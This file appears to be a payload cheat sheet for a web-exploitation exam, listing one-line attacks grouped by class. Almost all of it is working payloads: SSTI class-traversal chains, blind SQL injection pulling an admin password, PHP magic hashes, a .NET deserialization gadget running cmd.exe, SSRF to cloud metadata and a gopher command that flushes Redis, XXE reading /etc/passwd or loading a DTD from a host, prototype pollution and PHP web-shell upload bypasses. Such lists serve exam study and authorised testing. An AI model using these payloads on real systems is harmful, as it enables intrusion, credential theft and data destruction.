@@ -1,0 +1,57 @@
+# WEB-300 payload quick-corpus — one line per payload, grouped by class
+# (exam-speed reference, not a fuzzing dictionary)
+
+## SSTI probe ladder
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{7*'7'}}        # jinja2 -> 7777777, twig -> 49
+{{config}}
+{{self.__class__.__mro__[1].__subclasses__()}}
+{{request|attr('application')}}
+
+## Blind SQLi (boolean)
+' AND 1=1-- -
+' AND 1=2-- -
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -
+' AND ASCII(SUBSTRING((SELECT version()),1,1))>77-- -
+
+## Blind SQLi (time)
+' AND IF(1=1,SLEEP(5),0)-- -
+'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
+1' OR (SELECT 1337 FROM (SELECT(SLEEP(5)))a) AND '1'='1
+
+## PHP type juggling
+password[]=1                     # array vs string compare
+hash=0e462097431906829019388988221   # md5 magic hash (== 0)
+hash=0e830400451993494058024219903391
+token == 0 with any string token   # PHP<8 truthiness traps
+in_array("0.php", $allowed) without strict -> TRUE if $allowed has ints
+
+## .NET deserialization / ViewState
+ysoserial.exe -p ViewState -g TextFormattingRunProperties --validationalg=SHA256 --validationkey=KEY --generator=GEN
+__VIEWSTATE with TypeNameHandling.All -> {"$type":"System.Diagnostics.Process, System", "StartInfo":{"FileName":"cmd.exe","Arguments":"/c ping LHOST"}}
+LosFormatter / BinaryFormatter -> never with user input; gadget chains via ysoserial.net
+
+## SSRF
+http://127.0.0.1/ http://169.254.169.254/latest/meta-data/ http://[::1]/
+http://0177.0.0.1/ http://0x7f000001/ http://2130706433/
+url=file:///etc/passwd
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+
+## XXE
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://LHOST/evil.dtd">%d;]><r>1</r>
+
+## Prototype pollution
+?__proto__[isAdmin]=true
+{"__proto__":{"isAdmin":true}}
+constructor.prototype.shell=calc.exe      # (.NET JS deser / Node merge)
+client-side: fetch('/api',{method:'POST',body:'{"__proto__":{"role":"admin"}}'})
+
+## File upload bypass
+shell.php%00.jpg  shell.pHp  shell.php5  shell.phtml
+Content-Type: image/png + magic bytes (GIF89a;) prefix
+shell.jpg with .htaccess: AddType application/x-httpd-php .jpg
+path traversal in filename: ../../shell.php
